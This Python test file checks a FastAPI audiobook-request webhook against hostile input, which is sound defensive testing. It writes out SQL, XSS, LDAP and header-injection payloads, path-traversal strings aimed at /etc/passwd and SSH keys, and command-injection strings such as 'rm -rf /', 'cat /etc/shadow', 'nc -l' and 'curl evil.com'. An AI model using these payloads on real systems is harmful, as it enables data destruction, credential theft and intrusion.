import time
from unittest.mock import patch

from fastapi.testclient import TestClient

from src.main import app
from src.token_gen import generate_token
from src.utils import strip_html_tags


client = TestClient(app)


class TestSecurity:
    """Test security and input validation"""

    def test_sql_injection_attempts(self):
        """Test protection against SQL injection"""
        malicious_payloads = [
            "'; DROP TABLE tokens; --",
            "' OR '1'='1",
            "'; SELECT * FROM tokens; --",
            "admin'--",
            "' UNION SELECT * FROM tokens --",
        ]

        for malicious_input in malicious_payloads:
            payload = {
                "name": malicious_input,
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": "Safe Title"}),
            ):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

                # Should either succeed safely or reject cleanly
                assert resp.status_code in [200, 400, 422]
                # Should not cause server error or expose database
                assert resp.status_code != 500

    def test_xss_payload_sanitization(self):
        """Test XSS payload sanitization"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src='x' onerror='alert(1)'>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('xss')>",
            "<input type='image' src='x' onerror='alert(1)'>",
        ]

        for xss_payload in xss_payloads:
            # Test HTML sanitization - strip_html_tags removes HTML tags but may leave content
            cleaned = strip_html_tags(xss_payload)
            assert "<script>" not in cleaned.lower()
            assert "<iframe" not in cleaned.lower()
            assert "<body" not in cleaned.lower()
            assert "<input" not in cleaned.lower()
            # Note: javascript: URLs are not HTML tags so they won't be stripped by strip_html_tags

            # Test in title field
            payload = {
                "name": f"Test Book {xss_payload}",
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": f"Title {xss_payload}"}),
            ):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

                # Should handle XSS attempts safely
                assert resp.status_code in [200, 400, 422]

    def test_token_brute_force_protection(self):
        """Test protection against token brute force"""
        # Test with many invalid tokens
        invalid_tokens = [generate_token() for _ in range(50)]

        failure_count = 0
        for token in invalid_tokens:
            resp = client.get(f"/approve/{token}")
            # Application returns 410 for invalid/expired tokens
            if resp.status_code in [404, 410]:
                failure_count += 1

        # Should consistently reject invalid tokens
        assert failure_count == len(invalid_tokens)

        # Test rate limiting (if implemented)
        rapid_requests = []
        for _i in range(20):
            resp = client.post(
                "/webhook/audiobook-requests", json={"name": "test"}, headers={"X-Autobrr-Token": "invalid_token"}
            )
            rapid_requests.append(resp.status_code)

        # Should handle rapid invalid requests
        assert all(status in [401, 429, 400] for status in rapid_requests)

    def test_request_size_limits(self):
        """Test handling of oversized requests"""
        # Test extremely large payload
        large_payload = {
            "name": "A" * 100000,  # 100KB name
            "url": "http://example.com/view",
            "download_url": "http://example.com/download.torrent",
            "description": "B" * 1000000,  # 1MB description
        }

        with patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}):
            resp = client.post(
                "/webhook/audiobook-requests", json=large_payload, headers={"X-Autobrr-Token": "test_token"}
            )

            # Should handle large payloads gracefully
            assert resp.status_code in [200, 413, 422, 400]  # 413 = Request Entity Too Large

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//",
            "../../../../../root/.ssh/id_rsa",
        ]

        for malicious_path in path_traversal_attempts:
            # Test in various fields
            resp = client.get(f"/approve/{malicious_path}")
            # Should not expose file system - app returns 410 for invalid tokens
            assert resp.status_code in [404, 400, 422, 410]

            # Test as URL parameter
            resp = client.get(f"/?file={malicious_path}")
            assert resp.status_code in [200, 404, 400]  # Should not crash

    def test_header_injection_prevention(self):
        """Test prevention of header injection attacks"""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n",
            "User-Agent": "Mozilla/5.0\r\nInjected: header",
            "X-Autobrr-Token": "valid_token\r\nX-Injected: malicious",
            "Content-Type": "application/json\r\nX-Evil: header",
        }

        payload = {
            "name": "Test Book",
            "url": "http://example.com/view",
            "download_url": "http://example.com/download.torrent",
        }

        with patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}):
            for header_name, header_value in malicious_headers.items():
                resp = client.post("/webhook/audiobook-requests", json=payload, headers={header_name: header_value})

                # Should handle malicious headers safely
                assert resp.status_code in [200, 400, 401, 422]
                # Response should not contain injected content
                assert "Injected" not in resp.text
                assert "X-Evil" not in resp.text

    def test_json_injection_attempts(self):
        """Test handling of malicious JSON structures"""
        malicious_jsons = [
            # Deeply nested JSON
            {"a": {"b": {"c": {"d": {"e": {"f": "deep"}}}}}},
            # Large array
            {"items": list(range(10000))},
            # JSON with special characters
            {"name": "\x00\x01\x02\x03\x04\x05"},
            # Unicode attacks
            {"name": "\u202e\u202d\u202c"},
            # Null bytes
            {"name": "test\x00null"},
        ]

        with patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}):
            for malicious_json in malicious_jsons:
                try:
                    resp = client.post(
                        "/webhook/audiobook-requests", json=malicious_json, headers={"X-Autobrr-Token": "test_token"}
                    )

                    # Should handle malicious JSON safely
                    assert resp.status_code in [200, 400, 422, 500]
                except Exception as e:
                    # Should not cause unhandled exceptions
                    assert "json" in str(e).lower() or "decode" in str(e).lower()

    def test_unicode_security(self):
        """Test handling of dangerous Unicode characters"""
        dangerous_unicode = [
            "\u202e",  # Right-to-left override
            "\u200b",  # Zero-width space
            "\ufeff",  # Byte order mark
            "\u2028",  # Line separator
            "\u2029",  # Paragraph separator
        ]

        for dangerous_char in dangerous_unicode:
            payload = {
                "name": f"Test{dangerous_char}Book",
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": "Safe Title"}),
            ):
                try:
                    resp = client.post(
                        "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                    )

                    # Should handle dangerous Unicode safely
                    assert resp.status_code in [200, 400, 422]
                except UnicodeEncodeError:
                    # Some invalid Unicode sequences can't be JSON encoded - this is expected
                    pass

    def test_command_injection_prevention(self):
        """Test prevention of command injection"""
        command_injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(id)",
            ";cat /etc/shadow",
            "|nc -l 1234",
            "&curl evil.com",
        ]

        for malicious_command in command_injection_attempts:
            payload = {
                "name": f"Book{malicious_command}Title",
                "url": f"http://example.com{malicious_command}",
                "download_url": "http://example.com/download.torrent",
            }

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": "Safe Title"}),
            ):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

                # Should handle command injection attempts safely
                assert resp.status_code in [200, 400, 422]

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection"""
        ldap_injection_attempts = ["*", "*)(&", "*)(uid=*", "*)(|(uid=*", "admin)(|(uid=*", "*))(|(cn=*"]

        for ldap_payload in ldap_injection_attempts:
            payload = {
                "name": f"Book by {ldap_payload}",
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": "Safe Title"}),
            ):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

                # Should handle LDAP injection attempts safely
                assert resp.status_code in [200, 400, 422]

    def test_regex_dos_prevention(self):
        """Test prevention of Regular Expression Denial of Service (ReDoS)"""
        # Patterns that could cause catastrophic backtracking
        redos_patterns = [
            "a" * 10000 + "!",  # Long string that doesn't match
            "(" + "a" * 100 + ")*" + "b",  # Nested quantifiers
            "a" * 1000,  # Very long input
        ]

        for pattern in redos_patterns:
            payload = {
                "name": pattern,
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }

            start_time = time.time()

            with (
                patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}),
                patch("src.metadata.fetch_metadata", return_value={"title": "Safe Title"}),
            ):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

            end_time = time.time()

            # Should not take excessive time (more than 5 seconds)
            assert end_time - start_time < 5.0
            assert resp.status_code in [200, 400, 422]

    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        # Test without proper headers
        payload = {
            "name": "Test Book",
            "url": "http://example.com/view",
            "download_url": "http://example.com/download.torrent",
        }

        # Request without Origin header should be treated carefully
        resp = client.post("/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"})

        # Should still work for API endpoints, but web endpoints should be protected
        assert resp.status_code in [200, 401, 403]

    def test_input_length_validation(self):
        """Test validation of input field lengths"""
        test_cases = [
            ("name", "A" * 10000),
            ("url", "http://example.com/" + "A" * 5000),
            ("download_url", "http://example.com/" + "B" * 5000),
        ]

        for field_name, long_value in test_cases:
            payload = {
                "name": "Test Book",
                "url": "http://example.com/view",
                "download_url": "http://example.com/download.torrent",
            }
            payload[field_name] = long_value

            with patch.dict("os.environ", {"AUTOBRR_TOKEN": "test_token"}):
                resp = client.post(
                    "/webhook/audiobook-requests", json=payload, headers={"X-Autobrr-Token": "test_token"}
                )

                # Should handle long inputs gracefully
                assert resp.status_code in [200, 400, 413, 422]
